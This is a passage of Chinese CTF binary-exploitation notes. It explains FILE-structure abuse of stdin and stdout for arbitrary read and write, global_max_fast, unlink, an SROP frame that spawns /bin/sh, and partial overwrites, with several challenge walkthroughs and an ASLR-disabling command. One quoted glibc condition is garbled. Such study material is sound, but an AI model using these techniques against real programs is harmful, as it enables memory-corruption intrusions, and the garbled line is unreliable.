title="1.stdin标准输入缓冲区进行任意地址写"></a>1.<code>stdin</code>标准输入缓冲区进行任意地址写</h4><p>在前面的fread调用链中，看到fread最终调用了<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>函数来读入数据，因此要想利用<code>stdin</code>输入缓冲区需设置FILE结构体中<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span><span class="token function">_IO_new_file_underflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">{</span>  _IO_ssize_t count<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  ## 如果存在_IO_NO_READS标志，则直接返回  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_READS<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  ## 如果输入缓冲区里存在数据，则直接返回  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  ##调用_IO_SYSREAD函数最终执行系统调用读取数据  count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>               fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span></code></pre><p>所有的条件总结如下为：</p><ol><li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</li><li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>。</li><li>设置<code>_fileno</code>为0。</li><li>设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>；且使得<code>_IO_buf_end-_IO_buf_base</code>大于fread要读的数据。</li></ol><p>通常就是修改<code>_IO_buf_base</code>的低字节，然后就能够通过scanf或者其他调用IO函数的函数来修改FILE结构体，从而进一步劫持程序流。</p><p>还有需要注意的一点</p><p>在<code>_IO_new_file_underflow</code>函数中，有这个判断</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span></code></pre><p>也就是说只有当<code>_IO_read_ptr</code>等于<code>_IO_read_ptr</code>时，才会调用<code>_IO_SYSREAD</code>来写入数据</p><p>而在<code>_IO_SYSREAD</code>函数执行完后，有</p><pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_IO_read_end <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span></code></pre><p>这样的话我们想要再次利用IO_FILE来进行写数据的话就不能成功了，因此我们需要增大<code>_IO_read_ptr</code>使其满足上面的判断</p><p>如何增大？</p><p><code>IO_getc</code>或者<code>getchar</code>每执行一次都会使<code>_IO_read_ptr</code>+1，可以多次调用这两个函数来满足判断。</p><h4 id="2-stdout标准输入缓冲区进行任意地址读写"><a href="#2-stdout标准输入缓冲区进行任意地址读写" class="headerlink" title="2.stdout标准输入缓冲区进行任意地址读写"></a>2.<code>stdout</code>标准输入缓冲区进行任意地址读写</h4><h5 id="1-任意写"><a href="#1-任意写" class="headerlink" title="1.任意写"></a>1.任意写</h5><blockquote><p>任意写的主要原理为：构造好输出缓冲区将其改为想要任意写的地址，当输出数据可控时，会将数据拷贝至输出缓冲区，即实现了将可控数据拷贝至我们想要写的地址。</p></blockquote><p>相关源码如下</p><pre class=" language-c"><code class="language-c">_IO_size_t<span class="token function">_IO_new_file_xsputn</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    ## 判断输出缓冲区还有多少空间    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_end <span class="token operator">></span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">)</span>    count <span class="token operator">=</span> f<span class="token operator">-></span>_IO_write_end <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Space available. */</span>  ## 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token function">memcpy</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">,</span> s<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>只需要将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可</p><h5 id="2-任意读"><a href="#2-任意读" class="headerlink" title="2.任意读"></a>2.任意读</h5><blockquote><p>利用<code>stdout</code>进行任意地址读的原理为：控制输出缓冲区指针指向我们输入的地址，构造好条件，使得输出缓冲区为已经满的状态，再次调用输出函数时，程序会刷新输出缓冲区即会输出我们想要的数据，实现任意读。</p></blockquote><p>核心代码如下</p><pre class=" language-c"><code class="language-c"><span class="token function">_IO_new_file_overflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">int</span> ch<span class="token punctuation">)</span><span class="token punctuation">{</span>  ## 判断标志位是否包含_IO_NO_WRITES  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* SET ERROR */</span>    <span class="token punctuation">{</span>      f<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  ## 判断输出缓冲区是否为空  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> f<span class="token operator">-></span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>  ## 输出输出缓冲区   <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> ch<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span>_IO_size_t<span class="token function">new_do_write</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t to_do<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  _IO_size_t count<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING<span class="token punctuation">)</span>    fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      _IO_off64_t new_pos    <span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_write_base <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">==</span> _IO_pos_BAD<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> new_pos<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  ## 调用函数输出输出缓冲区  count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>需要满足的条件为</p><ol><li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>即<code>_flag &amp;~ 0x8</code>。</li><li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>即<code>_flag | 0x800</code></li><li>设置<code>_fileno</code>为1。</li><li>设置<code>_IO_write_base</code>指向想要泄露的地方；<code>_IO_write_ptr</code>指向泄露结束的地址。</li><li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code>或设置<code>_flag &amp; _IO_IS_APPENDING</code>即<code>_flag | 0x1000</code>。</li><li>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（非必须）。</li></ol><p>另外，在<code>_IO_new_file_overflow</code>函数中，有</p><pre class=" language-c"><code class="language-c"><span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们在做无泄漏的堆题时，改stdout结构体开头为<code>p64(flag)+p64(0)*3+p8(0)</code>,其中p8(0)对应修改的就是<code>_IO_write_base</code>，将其改小一些，就会输出<code>_IO_write_base</code>及其附近的一堆地址来达到泄漏libc地址的目的。</p><p>记录一下flag的构造</p><pre><code>flag=0flag&amp;=~8flag|=0x800flag|=0x8000在printf函数中会调用_IO_acquire_lock_clear_flags2 (stdout)来获取lock从而继续程序，如果没有_IO_USER_LOCK标志的话，程序会一直在循环，而_IO_USER_LOCK定义为#define _IO_USER_LOCK 0x8000，因此需要设置flag|=0x8000才能够使exp顺利进行</code></pre><h2 id="0x13-global-max-fast相关利用"><a href="#0x13-global-max-fast相关利用" class="headerlink" title="0x13.global_max_fast相关利用"></a>0x13.global_max_fast相关利用</h2><p><code>global_max_fast</code>规定了fastbin的最大大小，64位机器下，默认为0x80.</p><p>一般通过unsortedbin attack复写global_max_fast为main_arena的地址，这样后续我们释放多大的堆块都会被认为是fastbin，会根据fastbin的序号放到对应的地址中。如果我们能申请并释放很大的堆块的话，且计算好堆块的size，就能够在任意地址写入堆块的地址。通过这种任意地址写堆地址的方式，我们可以修改<code>_io_list_all</code>为一个堆块的地址，并事先在堆块中伪造好FILE结构体，类似于house of orange。</p><p>或者，有些题目不允许分配fastbin，例如规定了申请的chunk大小大于0x80，使用了mallopt(1,0)来限制了fastbin大小为0，也就是没有fastbin。这种情况下可以复写global_max_fast为main_arena，这样就可以重新使用fastbin了。</p><h2 id="0x14-unlink"><a href="#0x14-unlink" class="headerlink" title="0x14.unlink"></a>0x14.unlink</h2><p>原理不多说</p><p>构造方式为</p><p>假设有两个chunk，chunk1和chunk2，在chunk1中伪造一个fake_chunk，fake_chunk的fd为&amp;chunk1_addr-0x18，bk为&amp;chunk1_addr-0x10，还需要将chunk2的inuse位置为0，最后再free掉chunk2，这样chunk1的指针就会转移到&amp;chunk1_addr-0x18处，我们就能够控制堆的管理地址了。</p><h2 id="0x15-SROP"><a href="#0x15-SROP" class="headerlink" title="0x15.SROP"></a>0x15.SROP</h2><p>目前ctf比赛中单纯的srop很少见，多用于堆题开启了沙箱，需要用orw读取flag的情况</p><p>pwntools中集成了SROP的伪造模块，使用方式如下</p><pre class=" language-python"><code class="language-python">sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execve <span class="token comment" spellcheck="true">#系统调用号</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x120</span>  <span class="token comment" spellcheck="true"># "/bin/sh" 's addr 参数一</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x0</span> <span class="token comment" spellcheck="true">#参数二</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x0</span> <span class="token comment" spellcheck="true">#参数三</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stack_addr <span class="token comment" spellcheck="true">#执行完系统调用后要跳转的地址</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_ret <span class="token comment" spellcheck="true">#syscall ret的地址</span></code></pre><p>使用前还需声明目标架构</p><h2 id="0x16-partial-overwrite"><a href="#0x16-partial-overwrite" class="headerlink" title="0x16.partial overwrite"></a>0x16.partial overwrite</h2><p>当程序开启pie和canary时，如果程序的功能是read-printf这种类型，且能运行两次或者多次，第一次泄露canary，第二次覆盖函数返回地址的末尾两位，如果是mian函数的返回地址那就是<code>__libc_start_main</code>，复写末位两位可以使程序重新运行，但canary不会变，这样就能够泄露libc地址并且rop了。</p><h2 id="0x17-各种保护"><a href="#0x17-各种保护" class="headerlink" title="0x17.各种保护"></a>0x17.各种保护</h2><p>在ctfpwn中一般面对的是四种保护机制，分别为RELRO、Canary、NX和PIE</p><p>这四种保护的开启方式如下</p><h3 id="1-RELRO"><a href="#1-RELRO" class="headerlink" title="1.RELRO"></a>1.RELRO</h3><pre><code>gcc -o demo demo.c                        // 默认情况下，是Partial RELROgcc -z norelro -o demo demo.c            // 关闭，即No RELROgcc -z lazy -o demo demo.c                // 部分开启，即Partial RELROgcc -z now -o demo demo.c                // 全部开启，即FULL RELRO</code></pre><p>partial RELRO的情况下，GOT表是可写的(.got.plt)；而在FULL RELRO的情况下，GOT表不可写，lazy resolution 是被禁止的，所有导入的符号都在 startup time 被解析。</p><h3 id="2-Canary"><a href="#2-Canary" class="headerlink" title="2.Canary"></a>2.Canary</h3><pre><code>gcc -o demo demo.c                        // 默认情况下，不开启Canary保护gcc -fno-stack-protector -o demo demo.c  //禁用栈保护gcc -fstack-protector -o demo demo.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o demo demo.c //启用堆栈保护，为所有函数插入保护代码</code></pre><p>这种保护会在rbp上方添加一个cookie，32位机器下为4字节，64位机器下为8字节，且末尾为空字符</p><p>当栈溢出覆盖了canary后，就会调用___stack_chk_fail来终止程序</p><h3 id="3-NX"><a href="#3-NX" class="headerlink" title="3.NX"></a>3.NX</h3><pre><code>gcc -o demo demo.c                    // 默认情况下，开启NX保护gcc -z execstack -o demo demo.c        // 禁用NX保护gcc -z noexecstack -o demo demo.c    // 开启NX保护</code></pre><p>NX即No-eXecute（不可执行）的意思,windows上称为DEP，无法在栈上执行shellcode</p><h3 id="4-PIE"><a href="#4-PIE" class="headerlink" title="4.PIE"></a>4.PIE</h3><p>需要在ASLR开启后PIE才会生效</p><p>ASLR：内存地址随机化机制（address space layout randomization)</p><pre><code>0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><pre><code>sudo -s echo 0/1/2 &gt; /proc/sys/kernel/randomize_va_space</code></pre><p>开启PIE保护</p><pre><code>gcc -o demo demo.c                // 默认情况下，不开启PIEgcc -fpie -pie -o demo demo.c        // 开启PIE，此时强度为1gcc -fPIE -pie -o demo demo.c        // 开启PIE，此时为最高强度2gcc -fpic -o demo demo.c        // 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o demo demo.c        // 开启PIC，此时为最高强度2，不会开启PIE</code></pre><p>PIE随机化了ELF装载内存的基址（.text、plt、got、data等共同的基址）</p><h2 id="0x18-abs函数溢出点"><a href="#0x18-abs函数溢出点" class="headerlink" title="0x18.abs函数溢出点"></a>0x18.abs函数溢出点</h2><pre><code>abs函数接收4字节有符号int数，当传入0x80000000时，其返回结果仍然是0x80000000，由于4字节int正数将无法表示这么大，因此，其值是一个负数</code></pre><h2 id="0x19-指针未初始化漏洞"><a href="#0x19-指针未初始化漏洞" class="headerlink" title="0x19.指针未初始化漏洞"></a>0x19.指针未初始化漏洞</h2><h3 id="1-rec-33c3-2016"><a href="#1-rec-33c3-2016" class="headerlink" title="1.rec_33c3_2016"></a>1.rec_33c3_2016</h3><p>在功能5中</p><p><a href="https://imgchr.com/i/y6Ds4x" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6Ds4x.png" alt="y6Ds4x.png"></a></p><p>当v2==0时没有给v1赋值，然后调用了v1，如果我们能够控制栈上的数据就能够达成任意函数执行</p><p>在功能2中</p><p><a href="https://imgchr.com/i/y6rZZ9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6rZZ9.png" alt="y6rZZ9.png"></a></p><p>进行累加操作的时候，首先将栈压低了0x8的空间，然后又push了两个值入栈，所以这一系列操作相当于把栈压低了0x10，随后又将栈升高了0x8的空间，这样一来，每累加一次就把栈压低了0x8，所以只需要计算出当前栈和功能5中的v1的栈的距离就能够将esp挪过去，接着再利用这个累加功能往v1中写rop就行。</p><h3 id="2-ciscn-2019-ne-6"><a href="#2-ciscn-2019-ne-6" class="headerlink" title="2.ciscn_2019_ne_6"></a>2.ciscn_2019_ne_6</h3><p><a href="https://imgchr.com/i/y6rDsg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6rDsg.png" alt="y6rDsg.png"></a></p><p>在delete功能中，即使ptr并不满足条件，也依然会判断ptr是否有值，有值的话依然会将其free，且清空堆指针的操作是在if代码块内部，这样的话如果我们能够控制ptr的值就能够任意地址free。</p><p>如何控制ptr，需要从free的上一个函数入手</p><p><a href="https://imgchr.com/i/y6y3Ed" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6y3Ed.png" alt="y6y3Ed.png"></a></p><p>在进行free之前还有一个函数要执行，这个函数能够写入一些数据</p><p><a href="https://imgchr.com/i/y6yG4I" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6yG4I.png" alt="y6yG4I.png"></a></p><p>调试后能够发现，在栈中通过s写入0x28的数据刚好能够覆盖ptr，因此我们可以泄露出堆地址，先正常free一遍，然后利用这个漏洞再次free，就能够造成double free。</p><p>在这两题中，IDA很贴心的将未初始化的指针都用不同的颜色标注了出来，tql。</p><h2 id="0x1a-ELF文件中的一些段"><a href="#0x1a-ELF文件中的一些段" class="headerlink" title="0x1a.ELF文件中的一些段"></a>0x1a.ELF文件中的一些段</h2><p>.bss</p><p>​    包含目标文件中未初始化的全局变量。一般情况下，可执行程序在开 始运行的时候，系统会把这一段内容清零。但是，在运行期间的 bss 段是由系统初 始化而成的，在目标文件中.bss 节并不包含任何内容，其长度为 0</p><p>.data/.data1 </p><p>​    这两个节用于存放程序中被初始化过的全局变量。在目标文件中，它们是占 用实际的存储空间的，与.bss 节不同。</p><p>.debug</p><p>​    本节中含有调试信息，内容格式没有统一规定。所有以”.debug”为前缀的节名 字都是保留的。</p><p>.dynamic </p><p>​    本节包含动态连接信息</p><p>.dynstr </p><p>​    此节含有用于动态连接的字符串，一般是那些与符号表相关的名字</p><p>.dynsym</p><p>​    此节含有动态连接符号表。</p><p>.fini </p><p>​    此节包含进程终止时要执行的程序指令。当程序正常退出时，系统会执行这 一节中的代码。</p><p>.got </p><p>​    此节包含全局偏移量表。</p><p>.plt </p><p>​    此节包含函数连接表。</p><p>.init </p><p>​    此节包含进程初始化时要执行的程序指令。当程序开始运行时，系统会在进 入主函数之前执行这一节中的代码。</p><p>rodata/.rodata1 </p><p>​    本节包含程序中的只读数据，在程序装载时，它们一般会被装入进程空间中 那些只读的段中去。</p><p>.shstrtab </p><p>​    本节是“节名字表”，含有所有其它节的名字。</p><p>.strtab </p><p>​    本节用于存放字符串，主要是那些符号表项的名字。</p><p>.symtab </p><p>​    本节用于存放符号表。</p><p>.text </p><p>​    本节包含程序指令代码</p><h2 id="0x1b-巧用fileno"><a href="#0x1b-巧用fileno" class="headerlink" title="0x1b.巧用fileno"></a>0x1b.巧用fileno</h2><h3 id="1-d3ctf-2019-ezfile"><a href="#1-d3ctf-2019-ezfile" class="headerlink" title="1.d3ctf_2019_ezfile"></a>1.d3ctf_2019_ezfile</h3><p><a href="https://imgchr.com/i/yIVfvn" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIVfvn.png" alt="yIVfvn.png"></a></p><p>add功能最大只能分配0x18的chunk</p><p><a href="https://imgchr.com/i/yIVqC4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIVqC4.png" alt="yIVqC4.png"></a></p><p>delete功能存在uaf</p><p><a href="https://imgchr.com/i/yIVXvR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIVXvR.png" alt="yIVXvR.png"></a></p><p>encrypt功能存在栈溢出</p><p>程序没有show功能，且程序中没有调用puts、printf一类的的函数，无法利用io_file泄露libc地址。</p><p>利用方法为：</p><p>首先利用uaf修改IO_2_1_stdin的fileno参数为3</p><p>通过栈溢出的漏洞，partial overwrite返回地址到这</p><p><a href="https://imgchr.com/i/yIZQPg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIZQPg.png" alt="yIZQPg.png"></a></p><p>此时open函数的rdi来源于这里</p><p><a href="https://imgchr.com/i/yIZUaT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIZUaT.png" alt="yIZUaT.png"></a></p><p>rdi来源于rax，rax来源于seed，而seed是我们可以控制的，所以open函数的rdi也就是我们可以控制的，于是将seed设置为./flag，fd=open(“./flag”,0)=3，后面调用scanf的时候</p><p><a href="https://imgchr.com/i/yIZ5zd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIZ5zd.png" alt="yIZ5zd.png"></a></p><p>就会输出flag的内容。</p><h3 id="2-ciscn-final-2"><a href="#2-ciscn-final-2" class="headerlink" title="2.ciscn_final_2"></a>2.ciscn_final_2</h3><p><a href="https://imgchr.com/i/yIe0Tf" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIe0Tf.png" alt="yIe0Tf.png"></a></p><p>这题在初始化函数中打开了flag，并且将其fd修改为了666，后面又开启了沙箱</p><p><a href="https://imgchr.com/i/yIeH1J" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIeH1J.png" alt="yIeH1J.png"></a></p><p>在delete函数中存在uaf，且是通过bool这个全局变量来判断是否要free</p><p><a href="https://imgchr.com/i/yIm99e" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIm99e.png" alt="yIm99e.png"></a></p><p>但bool这一个全局变量却对应着两个类型的chunk，因此可以造成double free。</p><p>但由于能输入的数据都是数字，所以没办法通过正常的方法来getshell，因此需要利用flag的fd</p><p>利用uaf修改IO_2_1_stdin的fileno为666，在利用byebye功能中的scanf功能，即可输出flag</p><p><a href="https://imgchr.com/i/yImBuR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yImBuR.png" alt="yImBuR.png"></a></p><h2 id="0x1c-从RCTF-no-write中学到的一些知识"><a href="#0x1c-从RCTF-no-write中学到的一些知识" class="headerlink" title="0x1c.从RCTF no_write中学到的一些知识"></a>0x1c.从RCTF no_write中学到的一些知识</h2><p>1.<code>__libc_start_main</code>会在内存内写入<code>initial</code>,<code>exit_funcs_lock</code>的地址。</p><p>2.在<code>__do_global_dtors_aux</code>中有一条gadget：</p><pre class=" language-assembly"><code class="language-assembly">0x4005e8 <__do_global_dtors_aux+24>:    add    DWORD PTR [rbp-0x3d],ebx0x4005eb <__do_global_dtors_aux+27>:    nop    DWORD PTR [rax+rax*1+0x0]0x4005f0 <__do_global_dtors_aux+32>:    repz ret </code></pre><p>结合万能gadget可以做到往任意地址写入一个值</p><p>3.在strncmp中会调用<code>__strncmp_sse42</code>函数，这个函数的的参数和strncmp一样，地址可以在strncmp中查看</p><pre class=" language-assembly"><code class="language-assembly">0x7ffff7a81d19 <strncmp+25>:    lea    rax,[rip+0xe77f0]        # 0x7ffff7b69510 __strncmp_sse42的地址0x7ffff7a81d20 <strncmp+32>:    je     0x7ffff7a81d37 <strncmp+55></code></pre><h2 id="0x1d-glibc2-32中的一点变化"><a href="#0x1d-glibc2-32中的一点变化" class="headerlink" title="0x1d.glibc2.32中的一点变化"></a>0x1d.glibc2.32中的一点变化</h2><p>在glibc2.32中对tcache的取出和放入时进行了处理，称为<strong>safe-linking</strong>(异或加密)，具体代码如下</p><pre class=" language-c"><code class="language-c"><span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Mark this chunk as "in the tcache" so the test in _int_free will     detect a double free.  */</span>  e<span class="token operator">-></span>key <span class="token operator">=</span> tcache<span class="token punctuation">;</span>  e<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token function">PROTECT_PTR</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>e<span class="token operator">-></span>next<span class="token punctuation">,</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>tcache的fd位置会被赋值为<code>PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx])</code></p><p><code>PROTECT_PTR</code> 的实现如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> PROTECT_PTR(pos, ptr) \  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))</span><span class="token macro property">#<span class="token directive keyword">define</span> 